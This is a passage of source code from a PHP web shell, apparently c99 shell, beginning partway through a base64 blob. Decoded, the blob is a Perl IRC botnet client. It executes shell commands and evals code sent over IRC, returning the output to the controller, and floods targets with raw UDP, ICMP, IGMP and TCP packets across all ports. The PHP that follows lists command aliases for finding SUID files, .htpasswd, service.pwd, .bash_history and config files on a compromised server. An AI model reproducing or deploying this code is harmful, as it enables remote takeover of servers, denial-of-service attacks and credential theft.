Y3AoXCIkMVwiLCBcIiQyXCIpOyANCiAgIH0gDQogICBpZiAoXCRjYXNlID1+IC9eY3RjcGZsb29kXHMrKFxkKylccysoXFMrKSAoLiopLykgeyANCiAgICAgIGZvciAobXkgXCRjZiA9IDE7IFwkY2YgPD0gJDE7IFwkY2YrKykgeyANCiAgICAgICAgY3RjcChcIiQyXCIsIFwiJDNcIik7IA0KICAgICAgfSANCiAgIH0gDQogICBpZiAoXCRjYXNlID1+IC9eaW52aXRlXHMrKFxTKykgKC4qKS8pIHsgDQogICAgICBpbnZpdGUoXCIkMVwiLCBcIiQyXCIpOyANCiAgIH0gDQogICBpZiAoXCRjYXNlID1+IC9ebmljayAoLiopLykgeyANCiAgICAgIG5pY2soXCIkMVwiKTsgDQogICB9IA0KICAgaWYgKFwkY2FzZSA9fiAvXmNvbmVjdGFccysoXFMrKVxzKyhcUyspLykgeyANCiAgICAgICBjb25lY3RhcihcIiQyXCIsIFwiJDFcIiwgNjY2Nyk7IA0KICAgfSANCiAgIGlmIChcJGNhc2UgPX4gL15zZW5kXHMrKFxTKylccysoXFMrKS8pIHsgDQogICAgICBEQ0M6OlNFTkQoXCIkMVwiLCBcIiQyXCIpOyANCiAgIH0gDQogICBpZiAoXCRjYXNlID1+IC9ecmF3ICguKikvKSB7IA0KICAgICAgc2VuZHJhdyhcIiQxXCIpOyANCiAgIH0gDQogICBpZiAoXCRjYXNlID1+IC9eZXZhbCAoLiopLykgeyANCiAgICAgZXZhbCBcIiQxXCI7IA0KICAgfSANCn0NCg0Kc3ViIHNoZWxsIHsgDQogIHJldHVybiB1bmxlc3MgXCRzZWN2OyANCiAgbXkgXCRwcmludGw9XCRfWzBdOyANCiAgbXkgXCRjb21hbmRvPVwkX1sxXTsgDQogIGlmIChcJGNvbWFuZG8gPX4gL2NkICguKikvKSB7IA0KICAgIGNoZGlyKFwiJDFcIikgfHwgbXNnKFwiXCRwcmludGxcIiwgXCJEb3NzaWVyIE1ha2F5ZW5jaCA6RCBcIik7IA0KICAgIHJldHVybjsgDQogIH0gDQogIGVsc2lmIChcJHBpZCA9IGZvcmspIHsgDQogICAgIHdhaXRwaWQoXCRwaWQsIDApOyANCiAgfSBlbHNlIHsgDQogICAgICBpZiAoZm9yaykgeyANCiAgICAgICAgIGV4aXQ7IA0KICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICBteSBAcmVzcD1gXCRjb21hbmRvIDI+JjEgMz4mMWA7IA0KICAgICAgICAgICBteSBcJGM9MDsgDQogICAgICAgICAgIGZvcmVhY2ggbXkgXCRsaW5oYSAoQHJlc3ApIHsgDQogICAgICAgICAgICAgXCRjKys7IA0KICAgICAgICAgICAgIGNob3AgXCRsaW5oYTsgDQogICAgICAgICAgICAgc2VuZHJhdyhcJElSQ19jdXJfc29ja2V0LCBcIlBSSVZNU0cgXCRwcmludGwgOlwkbGluaGFcIik7IA0KICAgICAgICAgICAgIGlmIChcJGMgPT0gXCJcJGxpbmFzX21heFwiKSB7IA0KICAgICAgICAgICAgICAgXCRjPTA7IA0KICAgICAgICAgICAgICAgc2xlZXAgXCRzbGVlcDsgDQogICAgICAgICAgICAgfSANCiAgICAgICAgICAgfSANCiAgICAgICAgICAgZXhpdDsgDQogICAgICAgfSANCiAgfSANCn0gDQoNCnN1YiBhdHRhY2tlciB7IA0KICBteSBcJGlhZGRyID0gaW5ldF9hdG9uKFwkX1swXSk7IA0KICBteSBcJG1zZyA9ICdCJyB4IFwkX1sxXTsgDQogIG15IFwkZnRpbWUgPSBcJF9bMl07IA0KICBteSBcJGNwID0gMDsgDQogIG15ICglcGFjb3Rlcyk7IA0KICBcJHBhY290ZXN7aWNtcH0gPSBcJHBhY290ZXN7aWdtcH0gPSBcJHBhY290ZXN7dWRwfSA9IFwkcGFjb3Rlc3tvfSA9IFwkcGFjb3Rlc3t0Y3B9ID0gMDsgDQogICANCiAgc29ja2V0KFNPQ0sxLCBQRl9JTkVULCBTT0NLX1JBVywgMikgb3IgXCRjcCsrOyANCiAgc29ja2V0KFNPQ0syLCBQRl9JTkVULCBTT0NLX0RHUkFNLCAxNykgb3IgXCRjcCsrOyANCiAgc29ja2V0KFNPQ0szLCBQRl9JTkVULCBTT0NLX1JBVywgMSkgb3IgXCRjcCsrOyANCiAgc29ja2V0KFNPQ0s0LCBQRl9JTkVULCBTT0NLX1JBVywgNikgb3IgXCRjcCsrOyANCiAgcmV0dXJuKHVuZGVmKSBpZiBcJGNwID09IDQ7IA0KICBteSBcJGl0aW1lID0gdGltZTsgDQogIG15IChcJGN1cl90aW1lKTsgDQogIHdoaWxlICggMSApIHsgDQogICAgIGZvciAobXkgXCRwb3J0YSA9IDE7IFwkcG9ydGEgPD0gNjU1MzU7IFwkcG9ydGErKykgeyANCiAgICAgICBcJGN1cl90aW1lID0gdGltZSAtIFwkaXRpbWU7IA0KICAgICAgIGxhc3QgaWYgXCRjdXJfdGltZSA+PSBcJGZ0aW1lOyANCiAgICAgICBzZW5kKFNPQ0sxLCBcJG1zZywgMCwgc29ja2FkZHJfaW4oXCRwb3J0YSwgXCRpYWRkcikpIGFuZCBcJHBhY290ZXN7aWdtcH0rKzsgDQogICAgICAgc2VuZChTT0NLMiwgXCRtc2csIDAsIHNvY2thZGRyX2luKFwkcG9ydGEsIFwkaWFkZHIpKSBhbmQgXCRwYWNvdGVze3VkcH0rKzsgDQogICAgICAgc2VuZChTT0NLMywgXCRtc2csIDAsIHNvY2thZGRyX2luKFwkcG9ydGEsIFwkaWFkZHIpKSBhbmQgXCRwYWNvdGVze2ljbXB9Kys7IA0KICAgICAgIHNlbmQoU09DSzQsIFwkbXNnLCAwLCBzb2NrYWRkcl9pbihcJHBvcnRhLCBcJGlhZGRyKSkgYW5kIFwkcGFjb3Rlc3t0Y3B9Kys7IA0KDQogICAgICAgIyBEb1MgPz8gOlAgDQogICAgICAgZm9yIChteSBcJHBjID0gMzsgXCRwYyA8PSAyNTU7XCRwYysrKSB7IA0KICAgICAgICAgbmV4dCBpZiBcJHBjID09IDY7IA0KICAgICAgICAgXCRjdXJfdGltZSA9IHRpbWUgLSBcJGl0aW1lOyANCiAgICAgICAgIGxhc3QgaWYgXCRjdXJfdGltZSA+PSBcJGZ0aW1lOyANCiAgICAgICAgIHNvY2tldChTT0NLNSwgUEZfSU5FVCwgU09DS19SQVcsIFwkcGMpIG9yIG5leHQ7IA0KICAgICAgICAgc2VuZChTT0NLNSwgXCRtc2csIDAsIHNvY2thZGRyX2luKFwkcG9ydGEsIFwkaWFkZHIpKSBhbmQgXCRwYWNvdGVze299Kys7OyANCiAgICAgICB9IA0KICAgICB9IA0KICAgICBsYXN0IGlmIFwkY3VyX3RpbWUgPj0gXCRmdGltZTsgDQogIH0gDQogIHJldHVybihcJGN1cl90aW1lLCAlcGFjb3Rlcyk7IA0KfSANCg0KIyMjIyMjIyMjIyMjIyANCiMgQUxJQVNFUyAjIA0KIyMjIyMjIyMjIyMjIw0KDQpzdWIgYWN0aW9uIHsgDQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOyANCiAgIHNlbmRyYXcoXCJQUklWTVNHIFwkX1swXSA6XFwwMDFBQ1RJT04gXCRfWzFdXFwwMDFcIik7IA0KfSANCg0Kc3ViIGN0Y3AgeyANCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7IA0KICAgc2VuZHJhdyhcIlBSSVZNU0cgXCRfWzBdIDpcXDAwMVwkX1sxXVxcMDAxXCIpOyANCn0gDQpzdWIgbXNnIHsgDQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOyANCiAgIHNlbmRyYXcoXCJQUklWTVNHIFwkX1swXSA6XCRfWzFdXCIpOyANCn0gDQoNCnN1YiBub3RpY2UgeyANCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7IA0KICAgc2VuZHJhdyhcIk5PVElDRSBcJF9bMF0gOlwkX1sxXVwiKTsgDQp9IA0KDQpzdWIgb3AgeyANCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7IA0KICAgc2VuZHJhdyhcIk1PREUgXCRfWzBdICtvIFwkX1sxXVwiKTsgDQp9IA0Kc3ViIGRlb3AgeyANCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7IA0KICAgc2VuZHJhdyhcIk1PREUgXCRfWzBdIC1vIFwkX1sxXVwiKTsgDQp9IA0Kc3ViIGhvcCB7IA0KICAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7IA0KICAgc2VuZHJhdyhcIk1PREUgXCRfWzBdICtoIFwkX1sxXVwiKTsgDQp9IA0Kc3ViIGRlaG9wIHsgDQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOyANCiAgIHNlbmRyYXcoXCJNT0RFIFwkX1swXSAraCBcJF9bMV1cIik7IA0KfSANCnN1YiB2b2ljZSB7IA0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsgDQogICBzZW5kcmF3KFwiTU9ERSBcJF9bMF0gK3YgXCRfWzFdXCIpOyANCn0gDQpzdWIgZGV2b2ljZSB7IA0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsgDQogICBzZW5kcmF3KFwiTU9ERSBcJF9bMF0gLXYgXCRfWzFdXCIpOyANCn0gDQpzdWIgYmFuIHsgDQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOyANCiAgIHNlbmRyYXcoXCJNT0RFIFwkX1swXSArYiBcJF9bMV1cIik7IA0KfSANCnN1YiB1bmJhbiB7IA0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsgDQogICBzZW5kcmF3KFwiTU9ERSBcJF9bMF0gLWIgXCRfWzFdXCIpOyANCn0gDQpzdWIga2ljayB7IA0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsgDQogICBzZW5kcmF3KFwiS0lDSyBcJF9bMF0gXCRfWzFdIDpcJF9bMl1cIik7IA0KfSANCg0Kc3ViIG1vZG8geyANCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDA7IA0KICAgc2VuZHJhdyhcIk1PREUgXCRfWzBdIFwkX1sxXVwiKTsgDQp9IA0Kc3ViIG1vZGUgeyBtb2RvKEBfKTsgfSANCg0Kc3ViIGogeyAmam9pbihAXyk7IH0gDQpzdWIgam9pbiB7IA0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMDsgDQogICBzZW5kcmF3KFwiSk9JTiBcJF9bMF1cIik7IA0KfSANCnN1YiBwIHsgcGFydChAXyk7IH0gDQpzdWIgcGFydCB7c2VuZHJhdyhcIlBBUlQgXCRfWzBdXCIpO30gDQoNCnN1YiBuaWNrIHsgDQogIHJldHVybiB1bmxlc3MgJCNfID09IDA7IA0KICBzZW5kcmF3KFwiTklDSyBcJF9bMF1cIik7IA0KfSANCg0Kc3ViIGludml0ZSB7IA0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsgDQogICBzZW5kcmF3KFwiSU5WSVRFIFwkX1sxXSBcJF9bMF1cIik7IA0KfSANCnN1YiB0b3BpY28geyANCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7IA0KICAgc2VuZHJhdyhcInRvcElDIFwkX1swXSBcJF9bMV1cIik7IA0KfSANCnN1YiB0b3BpYyB7IHRvcGljbyhAXyk7IH0gDQoNCnN1YiB3aG9pcyB7IA0KICByZXR1cm4gdW5sZXNzICQjXyA9PSAwOyANCiAgc2VuZHJhdyhcIldIT0lTIFwkX1swXVwiKTsgDQp9IA0Kc3ViIHdobyB7IA0KICByZXR1cm4gdW5sZXNzICQjXyA9PSAwOyANCiAgc2VuZHJhdyhcIldITyBcJF9bMF1cIik7IA0KfSANCnN1YiBuYW1lcyB7IA0KICByZXR1cm4gdW5sZXNzICQjXyA9PSAwOyANCiAgc2VuZHJhdyhcIk5BTUVTIFwkX1swXVwiKTsgDQp9IA0Kc3ViIGF3YXkgeyANCiAgc2VuZHJhdyhcIkFXQVkgXCRfWzBdXCIpOyANCn0gDQpzdWIgYmFjayB7IGF3YXkoKTsgfSANCnN1YiBxdWl0IHsgDQogIHNlbmRyYXcoXCJRVUlUIDpcJF9bMF1cIik7IA0KfSANCg0KIyBEQ0MgDQoNCnBhY2thZ2UgRENDOyANCg0Kc3ViIGNvbm5lY3Rpb25zIHsgDQogICBteSBAcmVhZHkgPSBcJGRjY19zZWwtPmNhbl9yZWFkKDEpOyANCiMgcmV0dXJuIHVubGVzcyAoQHJlYWR5KTsgDQogICBmb3JlYWNoIG15IFwkZmggKEByZWFkeSkgeyANCiAgICAgbXkgXCRkY2N0aXBvID0gXCREQ0N7XCRmaH17dGlwb307IA0KICAgICBteSBcJGFycXVpdm8gPSBcJERDQ3tcJGZofXthcnF1aXZvfTsgDQogICAgIG15IFwkYnl0ZXMgPSBcJERDQ3tcJGZofXtieXRlc307IA0KICAgICBteSBcJGN1cl9ieXRlID0gXCREQ0N7XCRmaH17Y3VyYnl0ZX07IA0KICAgICBteSBcJG5pY2sgPSBcJERDQ3tcJGZofXtuaWNrfTsgDQoNCiAgICAgbXkgXCRtc2c7IA0KICAgICBteSBcJG5yZWFkID0gc3lzcmVhZChcJGZoLCBcJG1zZywgMTAyNDApOyANCg0KICAgICBpZiAoXCRucmVhZCA9PSAwIGFuZCBcJGRjY3RpcG8gPX4gL14oZ2V0fHNlbmRjb24pJC8pIHsgDQogICAgICAgIFwkRENDe1wkZmh9e3N0YXR1c30gPSBcIkNhbmNlbGFkb1wiOyANCiAgICAgICAgXCREQ0N7XCRmaH17ZnRpbWV9ID0gdGltZTsgDQogICAgICAgIFwkZGNjX3NlbC0+cmVtb3ZlKFwkZmgpOyANCiAgICAgICAgXCRmaC0+Y2xvc2U7IA0KICAgICAgICBuZXh0OyANCiAgICAgfSANCg0KICAgICBpZiAoXCRkY2N0aXBvIGVxIFwiZ2V0XCIpIHsgDQogICAgICAgIFwkRENDe1wkZmh9e2N1cmJ5dGV9ICs9IGxlbmd0aChcJG1zZyk7IA0KDQogICAgICAgIG15IFwkY3VyX2J5dGUgPSBcJERDQ3tcJGZofXtjdXJieXRlfTsgDQoNCiAgICAgICAgb3BlbihGSUxFLCBcIj4+IFwkYXJxdWl2b1wiKTsgDQogICAgICAgIHByaW50IEZJTEUgXCJcJG1zZ1wiIGlmIChcJGN1cl9ieXRlIDw9IFwkYnl0ZXMpOyANCiAgICAgICAgY2xvc2UoRklMRSk7IA0KDQogICAgICAgIG15IFwkcGFja2J5dGUgPSBwYWNrKFwiTlwiLCBcJGN1cl9ieXRlKTsgDQogICAgICAgIHByaW50IFwkZmggXCJcJHBhY2tieXRlXCI7IA0KDQogICAgICAgIGlmIChcJGJ5dGVzID09IFwkY3VyX2J5dGUpIHsgDQogICAgICAgICAgIFwkZGNjX3NlbC0+cmVtb3ZlKFwkZmgpOyANCiAgICAgICAgICAgXCRmaC0+Y2xvc2U7IA0KICAgICAgICAgICBcJERDQ3tcJGZofXtzdGF0dXN9ID0gXCJSZWNlYmlkb1wiOyANCiAgICAgICAgICAgXCREQ0N7XCRmaH17ZnRpbWV9ID0gdGltZTsgDQogICAgICAgICAgIG5leHQ7IA0KICAgICAgICB9IA0KICAgICB9IGVsc2lmIChcJGRjY3RpcG8gZXEgXCJzZW5kXCIpIHsgDQogICAgICAgICAgbXkgXCRzZW5kID0gXCRmaC0+YWNjZXB0OyANCiAgICAgICAgICBcJHNlbmQtPmF1dG9mbHVzaCgxKTsgDQogICAgICAgICAgXCRkY2Nfc2VsLT5hZGQoXCRzZW5kKTsgDQogICAgICAgICAgXCRkY2Nfc2VsLT5yZW1vdmUoXCRmaCk7IA0KICAgICAgICAgIFwkRENDe1wkc2VuZH17dGlwb30gPSAnc2VuZGNvbic7IA0KICAgICAgICAgIFwkRENDe1wkc2VuZH17aXRpbWV9ID0gdGltZTsgDQogICAgICAgICAgXCREQ0N7XCRzZW5kfXtuaWNrfSA9IFwkbmljazsgDQogICAgICAgICAgXCREQ0N7XCRzZW5kfXtieXRlc30gPSBcJGJ5dGVzOyANCiAgICAgICAgICBcJERDQ3tcJHNlbmR9e2N1cmJ5dGV9ID0gMDsgDQogICAgICAgICAgXCREQ0N7XCRzZW5kfXthcnF1aXZvfSA9IFwkYXJxdWl2bzsgDQogICAgICAgICAgXCREQ0N7XCRzZW5kfXtpcH0gPSBcJHNlbmQtPnBlZXJob3N0OyANCiAgICAgICAgICBcJERDQ3tcJHNlbmR9e3BvcnRhfSA9IFwkc2VuZC0+cGVlcnBvcnQ7IA0KICAgICAgICAgIFwkRENDe1wkc2VuZH17c3RhdHVzfSA9IFwiRW52aWFuZG9cIjsgDQogICAgICAgICAgb3BlbihGSUxFLCBcIjwgXCRhcnF1aXZvXCIpOyANCiAgICAgICAgICBteSBcJGZieXRlczsgDQogICAgICAgICAgcmVhZChGSUxFLCBcJGZieXRlcywgMTAyNCk7IA0KICAgICAgICAgIHByaW50IFwkc2VuZCBcIlwkZmJ5dGVzXCI7IA0KICAgICAgICAgIGNsb3NlIEZJTEU7IA0KIyBkZWxldGUoXCREQ0N7XCRmaH0pOyANCn0gZWxzaWYgKFwkZGNjdGlwbyBlcSAnc2VuZGNvbicpIHsgDQogICAgICAgICAgbXkgXCRieXRlc19zZW5kZWQgPSB1bnBhY2soXCJOXCIsIFwkbXNnKTsgDQogICAgICAgICAgXCREQ0N7XCRmaH17Y3VyYnl0ZX0gPSBcJGJ5dGVzX3NlbmRlZDsgDQogICAgICAgICAgaWYgKFwkYnl0ZXNfc2VuZGVkID09IFwkYnl0ZXMpIHsgDQogICAgICAgICAgICAgXCRmaC0+Y2xvc2U7IA0KICAgICAgICAgICAgIFwkZGNjX3NlbC0+cmVtb3ZlKFwkZmgpOyANCiAgICAgICAgICAgICBcJERDQ3tcJGZofXtzdGF0dXN9ID0gXCJFbnZpYWRvXCI7IA0KICAgICAgICAgICAgIFwkRENDe1wkZmh9e2Z0aW1lfSA9IHRpbWU7IA0KICAgICAgICAgICAgIG5leHQ7IA0KICAgICAgICAgIH0gDQogICAgICAgICAgb3BlbihTRU5ERklMRSwgXCI8IFwkYXJxdWl2b1wiKTsgDQogICAgICAgICAgc2VlayhTRU5ERklMRSwgXCRieXRlc19zZW5kZWQsIDApOyANCiAgICAgICAgICBteSBcJHNlbmRfYnl0ZXM7IA0KICAgICAgICAgIHJlYWQoU0VOREZJTEUsIFwkc2VuZF9ieXRlcywgMTAyNCk7IA0KICAgICAgICAgIHByaW50IFwkZmggXCJcJHNlbmRfYnl0ZXNcIjsgDQogICAgICAgICAgY2xvc2UoU0VOREZJTEUpOyANCiAgICAgfSANCiAgIH0gDQp9IA0KDQpzdWIgU0VORCB7IA0KICBteSAoXCRuaWNrLCBcJGFycXVpdm8pID0gQF87IA0KICB1bmxlc3MgKC1yIFwiXCRhcnF1aXZvXCIpIHsgDQogICAgcmV0dXJuKDApOyANCiAgfSANCiAgDQogIG15IFwkZGNjYXJrID0gXCRhcnF1aXZvOyANCiAgXCRkY2NhcmsgPX4gcy9bLipcL10oXFMrKS8kMS87IA0KDQogIG15IFwkbWV1aXAgPSAkOjppcmNfc2VydmVyc3tcIiQ6OklSQ19jdXJfc29ja2V0XCJ9eydtZXVpcCd9OyANCiAgbXkgXCRsb25naXAgPSB1bnBhY2soXCJOXCIsaW5ldF9hdG9uKFwkbWV1aXApKTsgDQoNCiAgbXkgQGZpbGVzdGF0ID0gc3RhdChcJGFycXVpdm8pOyANCiAgbXkgXCRzaXplX3RvdGFsPVwkZmlsZXN0YXRbN107IA0KICBpZiAoXCRzaXplX3RvdGFsID09IDApIHsgDQogICAgIHJldHVybigwKTsgDQogIH0gDQoNCiAgbXkgKFwkcG9ydGEsIFwkc2VuZHNvY2spOyANCiAgZG8geyANCiAgICBcJHBvcnRhID0gaW50IHJhbmQoNjQ1MTEpOyANCiAgICBcJHBvcnRhICs9IDEwMjQ7IA0KICAgIFwkc2VuZHNvY2sgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoTGlzdGVuPT4xLCBMb2NhbFBvcnQgPT5cJHBvcnRhLCBQcm90byA9PiAndGNwJykgYW5kIFwkZGNjX3NlbC0+YWRkKFwkc2VuZHNvY2spOyANCiAgfSB1bnRpbCBcJHNlbmRzb2NrOyANCg0KICBcJERDQ3tcJHNlbmRzb2NrfXt0aXBvfSA9ICdzZW5kJzsgDQogIFwkRENDe1wkc2VuZHNvY2t9e25pY2t9ID0gXCRuaWNrOyANCiAgXCREQ0N7XCRzZW5kc29ja317Ynl0ZXN9ID0gXCRzaXplX3RvdGFsOyANCiAgXCREQ0N7XCRzZW5kc29ja317YXJxdWl2b30gPSBcJGFycXVpdm87IA0KDQogICY6OmN0Y3AoXCJcJG5pY2tcIiwgXCJEQ0MgU0VORCBcJGRjY2FyayBcJGxvbmdpcCBcJHBvcnRhIFwkc2l6ZV90b3RhbFwiKTsgDQoNCn0gDQoNCnN1YiBHRVQgeyANCiAgbXkgKFwkYXJxdWl2bywgXCRkY2Nsb25naXAsIFwkZGNjcG9ydGEsIFwkYnl0ZXMsIFwkbmljaykgPSBAXzsgDQogIHJldHVybigwKSBpZiAoLWUgXCJcJGFycXVpdm9cIik7IA0KICBpZiAob3BlbihGSUxFLCBcIj4gXCRhcnF1aXZvXCIpKSB7IA0KICAgICBjbG9zZSBGSUxFOyANCiAgfSBlbHNlIHsgDQogICAgcmV0dXJuKDApOyANCiAgfSANCg0KICBteSBcJGRjY2lwPWZpeGFkZHIoXCRkY2Nsb25naXApOyANCiAgcmV0dXJuKDApIGlmIChcJGRjY3BvcnRhIDwgMTAyNCBvciBub3QgZGVmaW5lZCBcJGRjY2lwIG9yIFwkYnl0ZXMgPCAxKTsgDQogIG15IFwkZGNjc29jayA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90bz0+XCJ0Y3BcIiwgUGVlckFkZHI9PlwkZGNjaXAsIFBlZXJQb3J0PT5cJGRjY3BvcnRhLCBUaW1lb3V0PT4xNSkgb3IgcmV0dXJuICgwKTsgDQogIFwkZGNjc29jay0+YXV0b2ZsdXNoKDEpOyANCiAgXCRkY2Nfc2VsLT5hZGQoXCRkY2Nzb2NrKTsgDQogIFwkRENDe1wkZGNjc29ja317dGlwb30gPSAnZ2V0JzsgDQogIFwkRENDe1wkZGNjc29ja317aXRpbWV9ID0gdGltZTsgDQogIFwkRENDe1wkZGNjc29ja317bmlja30gPSBcJG5pY2s7IA0KICBcJERDQ3tcJGRjY3NvY2t9e2J5dGVzfSA9IFwkYnl0ZXM7IA0KICBcJERDQ3tcJGRjY3NvY2t9e2N1cmJ5dGV9ID0gMDsgDQogIFwkRENDe1wkZGNjc29ja317YXJxdWl2b30gPSBcJGFycXVpdm87IA0KICBcJERDQ3tcJGRjY3NvY2t9e2lwfSA9IFwkZGNjaXA7IA0KICBcJERDQ3tcJGRjY3NvY2t9e3BvcnRhfSA9IFwkZGNjcG9ydGE7IA0KICBcJERDQ3tcJGRjY3NvY2t9e3N0YXR1c30gPSBcIlJlY2ViZW5kb1wiOyANCn0gDQoNCiMgcG8gZmljbyB4YXRvIGRlIG9yZ2FuaXphIG8gc3RhdHVzLi4gZGFpIGZpeiBlbGUgcmV0b3JuYSBvIHN0YXR1cyBkZSBhY29yZG8gY29tIG8gc29ja2V0Li4gZGFpIG8gQURNLnBsIGxpc3RhIG9zIHNvY2tldHMgZSBmYXogYXMgcGVyZ3VudGFzIA0Kc3ViIFN0YXR1cyB7IA0KICBteSBcJHNvY2tldCA9IHNoaWZ0OyANCiAgbXkgXCRzb2NrX3RpcG8gPSBcJERDQ3tcJHNvY2tldH17dGlwb307IA0KICB1bmxlc3MgKGxjKFwkc29ja190aXBvKSBlcSBcImNoYXRcIikgeyANCiAgICBteSBcJG5pY2sgPSBcJERDQ3tcJHNvY2tldH17bmlja307IA0KICAgIG15IFwkYXJxdWl2byA9IFwkRENDe1wkc29ja2V0fXthcnF1aXZvfTsgDQogICAgbXkgXCRpdGltZSA9IFwkRENDe1wkc29ja2V0fXtpdGltZX07IA0KICAgIG15IFwkZnRpbWUgPSB0aW1lOyANCiAgICBteSBcJHN0YXR1cyA9IFwkRENDe1wkc29ja2V0fXtzdGF0dXN9OyANCiAgICBcJGZ0aW1lID0gXCREQ0N7XCRzb2NrZXR9e2Z0aW1lfSBpZiBkZWZpbmVkKFwkRENDe1wkc29ja2V0fXtmdGltZX0pOyANCg0KICAgIG15IFwkZF90aW1lID0gXCRmdGltZS1cJGl0aW1lOyANCg0KICAgIG15IFwkY3VyX2J5dGUgPSBcJERDQ3tcJHNvY2tldH17Y3VyYnl0ZX07IA0KICAgIG15IFwkYnl0ZXNfdG90YWwgPSBcJERDQ3tcJHNvY2tldH17Ynl0ZXN9OyANCg0KICAgIG15IFwkcmF0ZSA9IDA7IA0KICAgIFwkcmF0ZSA9IChcJGN1cl9ieXRlLzEwMjQpL1wkZF90aW1lIGlmIFwkY3VyX2J5dGUgPiAwOyANCiAgICBteSBcJHBvcmNlbiA9IChcJGN1cl9ieXRlKjEwMCkvXCRieXRlc190b3RhbDsgDQoNCiAgICBteSAoXCRyX2R1diwgXCRwX2R1dik7IA0KICAgIGlmIChcJHJhdGUgPX4gL14oXGQrKVwuKFxkKShcZCkoXGQpLykgeyANCiAgICAgICBcJHJfZHV2ID0gJDM7IFwkcl9kdXYrKyBpZiAkNCA+PSA1OyANCiAgICAgICBcJHJhdGUgPSBcIiQxXC4kMlwiLlwiXCRyX2R1dlwiOyANCiAgICB9IA0KICAgIGlmIChcJHBvcmNlbiA9fiAvXihcZCspXC4oXGQpKFxkKShcZCkvKSB7IA0KICAgICAgIFwkcF9kdXYgPSAkMzsgXCRwX2R1disrIGlmICQ0ID49IDU7IA0KICAgICAgIFwkcG9yY2VuID0gXCIkMVwuJDJcIi5cIlwkcF9kdXZcIjsgDQogICAgfSANCiAgICByZXR1cm4oXCJcJHNvY2tfdGlwb1wiLFwiXCRzdGF0dXNcIixcIlwkbmlja1wiLFwiXCRhcnF1aXZvXCIsXCJcJGJ5dGVzX3RvdGFsXCIsIFwiXCRjdXJfYnl0ZVwiLFwiXCRkX3RpbWVcIiwgXCJcJHJhdGVcIiwgXCJcJHBvcmNlblwiKTsgDQogIH0gDQoNCiAgcmV0dXJuKDApOyANCn0gDQoNCiMgZXNzZSAnc3ViIGZpeGFkZHInIGRha2kgZm9pIHBlZ28gZG8gTkVUOjpJUkM6OkRDQyBpZGVudGljbyBzb2ggY29waWVpIGUgY29sb2VpIChjb2xva2FyIG5vbWUgZG8gYXV0b3IpIA0Kc3ViIGZpeGFkZHIgeyANCiAgICBteSAoXCRhZGRyZXNzKSA9IEBfOyANCg0KICAgIGNob21wIFwkYWRkcmVzczsgIyBqdXN0IGluIGNhc2UsIHNpZ2guIA0KICAgIGlmIChcJGFkZHJlc3MgPX4gL15cZCskLykgeyANCiAgICAgICAgcmV0dXJuIGluZXRfbnRvYShwYWNrIFwiTlwiLCBcJGFkZHJlc3MpOyANCiAgICB9IGVsc2lmIChcJGFkZHJlc3MgPX4gL15bMTJdP1xkezEsMn1cLlsxMl0/XGR7MSwyfVwuWzEyXT9cZHsxLDJ9XC5bMTJdP1xkezEsMn0kLykgeyANCiAgICAgICAgcmV0dXJuIFwkYWRkcmVzczsgDQogICAgfSBlbHNpZiAoXCRhZGRyZXNzID1+IHRyL2EtekEtWi8vKSB7ICMgV2hlZSEgT2JmdXNjYXRpb24hIA0KICAgICAgICByZXR1cm4gaW5ldF9udG9hKCgoZ2V0aG9zdGJ5bmFtZShcJGFkZHJlc3MpKVs0XSlbMF0pOyANCiAgICB9IGVsc2UgeyANCiAgICAgICAgcmV0dXJuOyANCiAgICB9IA0KfSANCg==";



// Command-aliases 
if (!$win) 
{ 
 $cmdaliases = array( 
array("-----------------------------------------------------------", "ls -la"), 
array("find all suid files", "find / -type f -perm -04000 -ls"), 
array("find suid files in current dir", "find . -type f -perm -04000 -ls"), 
array("find all sgid files", "find / -type f -perm -02000 -ls"), 
array("find sgid files in current dir", "find . -type f -perm -02000 -ls"), 
array("find config.inc.php files", "find / -type f -name config.inc.php"), 
array("find config* files", "find / -type f -name \"config*\""), 
array("find config* files in current dir", "find . -type f -name \"config*\""), 
array("find all writable folders and files", "find / -perm -2 -ls"), 
array("find all writable folders and files in current dir", "find . -perm -2 -ls"), 
array("find all service.pwd files", "find / -type f -name service.pwd"), 
array("find service.pwd files in current dir", "find . -type f -name service.pwd"), 
array("find all .htpasswd files", "find / -type f -name .htpasswd"), 
array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"), 
array("find all .bash_history files", "find / -type f -name .bash_history"), 
array("find .bash_history files in current dir", "find . -type f -name .bash_history"), 
array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"), 
array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"), 
array("list file attributes on a Linux second extended file system", "lsattr -va"), 
array("show opened ports", "netstat -an | grep -i listen") 
 ); 
} 
else 
{ 
 $cmdaliases = array( 
array("-----------------------------------------------------------", "dir"), 
array("show opened ports", "netstat -an") 
 ); 
} 

$sess_cookie = "c99shvars"; // Cookie-variable name 

$usefsbuff = TRUE; //Buffer-function 
$copy_unset = FALSE; //Remove copied files from buffer after pasting 

//Quick launch 
$quicklaunch = array( 
 array("<img src=\"".$surl."act=img&img=home\" alt=\"Home\" height=\"20\" width=\"20\" border=\"0\">",$surl), 
 array("<img src=\"".$surl."act=img&img=back\" alt=\"Back\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.back(1)"), 
 array("<img src=\"".$surl."act=img&img=forward\" alt=\"Forward\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.go(1)"), 
